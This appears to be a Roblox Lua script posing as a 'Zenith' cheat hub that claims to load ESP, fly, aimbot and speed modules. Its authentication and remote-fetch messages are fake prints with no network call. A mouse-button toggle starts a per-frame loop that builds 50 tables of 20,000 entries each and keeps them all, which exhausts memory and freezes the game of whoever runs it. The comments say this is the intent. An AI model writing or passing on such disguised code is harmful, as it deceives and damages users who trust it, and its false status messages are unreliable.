local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

print("[ZENITH]: Fetching remote source...")
task.wait(1.2)

local success, err = pcall(function()
    print("[ZENITH]: GET https://raw.githubusercontent.com/ZenithScripts/Auth/main/HWID_Verify.php")
    task.wait(1.5)
    print("[ZENITH]: Authentication Success! Welcome, User_4829.")
end)

task.wait(1)

print("[ZENITH]: Loading Universal Modules (ESP, Fly, Aimbot, Speed)...")
task.wait(2.5)

local isEnabled = false
local DataArchive = {}

local function initUniversalOptimization()
    RunService.RenderStepped:Connect(function()
        if isEnabled then
            -- Nested loop: This forces the CPU to calculate 50 heavy tables 
            -- every single frame. This will tank FPS instantly.
            for i = 1, 50 do
                local sessionData = {}
                for j = 1, 20000 do
                    sessionData[j] = {
                        Type = "Global_Buffer",
                        Value = math.random() * 100,
                        State = true,
                        Key = "0x" .. math.random(1000, 9999),
                        Extra = string.rep("MEM_LEAK", 10) 
                    }
                end
                table.insert(DataArchive, sessionData)
            end
        end
    end)
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.UserInputType == Enum.UserInputType.MouseButton5 then
        isEnabled = not isEnabled
        
        if isEnabled then
            print("[ZENITH]: Universal Hub ACTIVE.")
            initUniversalOptimization()
        else
            print("[ZENITH]: Universal Hub DISABLED.")
        end
    end
end)
